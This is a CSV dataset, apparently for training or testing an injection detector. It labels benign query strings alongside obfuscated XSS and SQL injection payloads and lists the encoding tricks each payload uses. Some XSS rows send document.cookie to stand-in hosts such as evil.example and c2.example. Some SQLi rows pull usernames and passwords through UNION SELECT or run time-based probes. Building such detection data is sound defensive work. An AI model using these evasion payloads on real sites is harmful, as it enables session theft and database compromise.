payload,label,techniques
%25253Cimg%252520src%25253Dx%252520onerror%25253Dalert%2525281%252529%25253E,xss,double_url_encode+url_encode+unicode_substitution
sort=asc&ref=book,benign,
%253Cstyle%253E%2540import%2520%2527http%253A%252F%252Fevil.example%252Fxss.css%2527%253B%253C%252Fstyle%253E,xss,case_toggle+double_url_encode+comment_insertion
user_id=2057,benign,
1%2527%2520AND%201%253D1%2520--,sqli,url_encode+partial_url_encode+comment_insertion
&lt;script\u003Ealert%28'xss&#39;\u0029&#60;/script%3E,xss,unicode_substitution+case_toggle+whitespace
<img src=x onerror=this.src=&#39;http://evil.example/'+document.cookie>,xss,unicode_substitution
currency=usd&lang=en&city=report,benign,
category=delta&session=27f1637,benign,
%27%20OR%20%271%27%3D%271,sqli,url_encode+case_toggle
<video><source/**/onerror=alert(1)></video>,xss,whitespace
theme=dark&limit=379&currency=usd,benign,
lang=id&price_min=2194,benign,
lang=en&currency=usd&ref=book,benign,
name=settings&token=3bdf2a8,benign,
%25253Cinput%252520onfocus%25253Dalert%2525281%252529%252520autofocus%25253E,xss,double_url_encode+whitespace+url_encode
category=camera,benign,
price_max=8067&lang=en,benign,
search=dashboard&tab=foxtrot,benign,
%27 OR SLEEP%285%29%3D%270,sqli,partial_url_encode
limit=6276,benign,
category=profile&size=m,benign,
1%252527%252520And%2525201%25253D1%252520--,sqli,case_toggle+double_url_encode+url_encode
admin%25252527%252520--,sqli,unicode_substitution+double_url_encode+url_encode
q=camera&price_min=3864&size=m,benign,
%2527%2529%252509or%250A%2528%25271%2527%253D%25271,sqli,case_toggle+whitespace+double_url_encode
%25253Cscript%25253Enew%252520Image%252528%252529.src%25253D%252527http%25253A%25252F%25252Fc2.example%25252F%25253Fc%25253D%252527%25252Bdocument.cookie%25253B%25253C%25252Fscript%25253E,xss,double_url_encode+url_encode
user_id=8038&city=settings,benign,
theme=dark&coupon=dashboard,benign,
color=foxtrot&email=jakarta@example.com,benign,
view=grid&format=json&tab=foxtrot,benign,
search=foxtrot&theme=dark,benign,
%22 UNI/*!50000*/ON SELECT table_name%20FROM information_schema.tables --,sqli,partial_url_encode+comment_insertion
%25253Csvg%252520onload%25253Dalert%2525281%252529%25253E,xss,comment_insertion+url_encode+double_url_encode
1%27%20AND%20SLEEP%287%29%20--,sqli,url_encode+comment_insertion
1%2527%252F%252A%25252A%252FAND%2525091%25253D1%252509--,sqli,whitespace+partial_url_encode+double_url_encode
category=settings,benign,
price_min=9395&session=1847684,benign,
"%27
UNION%2F*%2A/SELECT%0Ausername%2C	password%0aFROM%250ausers%0A--",sqli,whitespace+partial_url_encode
%3Csvg%20onload%3Dalert%281%29%3E,xss,url_encode
tab=invoice&color=invoice,benign,
price_min=5978,benign,
price_min=5254&price_max=2348,benign,
%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E,xss,url_encode
%2527%2520UNION%2520SELECT%2520NULL%252C%2520NULL%252C%2520NULL%2520--,sqli,double_url_encode
%2526%252360%253Ba%252520href%253D%252522javascript%25253Aalert%2525281%255Cu0029%252522%2526%252362%253Bclick%255Cu003C%25252Fa%2526gt%253B,xss,partial_url_encode+unicode_substitution+double_url_encode
%2522%2520UNION%2520SELECT%2520table_name%2520FROM%2520information_schema.tables%2520--,sqli,double_url_encode+unicode_substitution
color=foxtrot,benign,
user_id=169,benign,
<body/**/onload=alert('xss')>,xss,whitespace
